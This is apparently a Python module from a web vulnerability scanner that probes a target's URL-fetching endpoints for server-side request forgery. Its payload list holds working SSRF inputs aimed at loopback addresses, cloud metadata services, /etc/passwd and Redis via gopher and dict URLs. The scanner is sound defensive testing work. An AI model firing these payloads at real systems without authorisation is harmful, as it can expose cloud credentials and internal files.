"""
Server-Side Request Forgery (SSRF) scanner.
Tests:
- Internal IP reflection (127.0.0.1, 169.254.169.254, etc.)
- DNS rebinding via alternate IP notations
- Protocol smuggling (file://, gopher://, ftp://)
- Cloud metadata endpoints
"""
from __future__ import annotations

from urllib.parse import urlencode, urljoin, urlparse
from typing import Any

from core.base_module import BaseModule
from core.result import Severity


class SSRFScanner(BaseModule):
    name = "ssrf"
    description = "Server-Side Request Forgery detection"
    supported_vectors = ["ssrf"]

    INTERNAL_PAYLOADS = [
        ("url", "http://127.0.0.1/"),
        ("url", "http://localhost/"),
        ("url", "http://[::1]/"),
        ("url", "http://0.0.0.0/"),
        ("url", "http://0177.0.0.01/"),  # octal
        ("url", "http://2130706433/"),  # decimal
        ("url", "http://0177.1/"),  # dotted-octal
        ("url", "http://10.0.0.1/"),
        ("url", "http://192.168.1.1/"),
        ("url", "http://169.254.169.254/latest/meta-data/"),  # AWS IMDS
        ("url", "http://metadata.google.internal/"),  # GCP
        ("url", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),  # Azure
        ("url", "file:///etc/passwd"),
        ("url", "file:///C:/windows/system32/drivers/etc/hosts"),
        ("url", "ftp://anonymous:anonymous@127.0.0.1/"),
        ("url", "dict://127.0.0.1:6379/info"),  # Redis
        ("url", "gopher://127.0.0.1:6379/_INFO"),
    ]

    INDICATORS = [
        "root:", "daemon:", "bin:", "nobody:",  # /etc/passwd
        "127.0.0.1", "localhost",
        "ec2", "instance-id", "ami-id",  # AWS
        "computeMetadata", "project-id",  # GCP
        "Microsoft", "Windows",  # Windows paths
        "OK", "+PONG", "redis_version",  # Redis
    ]

    async def run(self, target: str, **kwargs: Any) -> list[Finding]:
        self._current_target = target
        endpoints = kwargs.get("endpoints", ["/fetch", "/proxy", "/url", "/api/fetch", "/webhook", "/callback"])
        for endpoint in endpoints:
            url = urljoin(target, endpoint)
            for param_name, payload in self.INTERNAL_PAYLOADS:
                await self._probe(url, param_name, payload)
        return self.findings

    async def _probe(self, url: str, param_name: str, payload: str) -> None:
        try:
            resp = await self.client.get(f"{url}?{urlencode({param_name: payload})}")
            body_lower = resp.text.lower()
            for indicator in self.INDICATORS:
                if indicator.lower() in body_lower:
                    self.add_finding(
                        vector="ssrf",
                        severity="critical",
                        title=f"SSRF vulnerability: internal resource accessible via {url}",
                        description=f"Payload '{payload}' triggered internal resource reflection. Indicator: '{indicator}'.",
                        confidence=80,
                        evidence=[
                            self.client.build_evidence(
                                resp.request, resp, payload=payload,
                                description=f"Internal resource indicator: {indicator}",
                            )
                        ],
                        remediation=(
                            "Block internal IP ranges (RFC 1918, loopback, link-local). "
                            "Use an allow-list for outbound URL schemes. "
                            "Disable unnecessary URL protocols (file://, gopher://, dict://)."
                        ),
                        references=[
                            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                            "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
                        ],
                    )
                    return
        except Exception:
            pass
